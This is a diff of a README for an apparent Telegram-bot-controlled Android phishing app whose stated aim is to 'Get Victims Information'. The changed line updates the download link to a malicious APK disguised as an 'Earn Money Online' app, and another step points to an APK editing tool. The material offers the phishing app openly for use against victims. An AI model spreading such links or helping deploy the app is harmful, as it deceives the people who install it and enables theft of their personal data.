@@ -26,7 +26,7 @@ A multifunctional Telegram Bot based Android App Get Victims Information Receive
 
 -[1]  Download <a href="https://maximoff.su/apktool/?lang=en">Apktool M</a>
 
-- [2] Download Our Phising App <a href="https://raw.githubusercontent.com/Teamex07/Ex-Ultra-Phisher/main/Earn%20Money%20Online.apk">Earn Money Online <a/>
+- [2] Download Our Phising App <a href="https://raw.githubusercontent.com/Teamex07/Ex-Ultra-Phisher/main/Earn%20mone%20online1.apk">Earn Money Online <a/>
 
 
 
